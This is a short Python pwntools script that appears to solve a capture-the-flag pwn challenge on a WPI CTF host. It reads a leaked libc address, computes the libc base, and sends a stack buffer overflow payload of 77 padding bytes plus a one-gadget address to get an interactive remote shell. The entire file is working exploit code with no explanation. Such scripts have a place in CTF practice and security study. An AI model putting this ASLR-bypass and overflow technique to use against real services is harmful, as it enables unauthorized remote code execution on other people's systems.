from pwn import *
target=remote('dorsia1.wpictf.xyz', 31337)
libc=ELF('/media/sf_kalishared/tools/The_Night-master/libcs/libc6_2.27-3ubuntu1_amd64.so')

leak=target.recvline().strip("\n")
print(leak)
libc_system=int(leak,16)-765772
print(hex(libc_system))
libc_base=libc_system-libc.symbols["system"]

gadget=0x10a38c
libc_gadget=libc_base+gadget

payload="A"*77
payload+=p64(libc_gadget)

target.sendline(payload)
target.interactive()

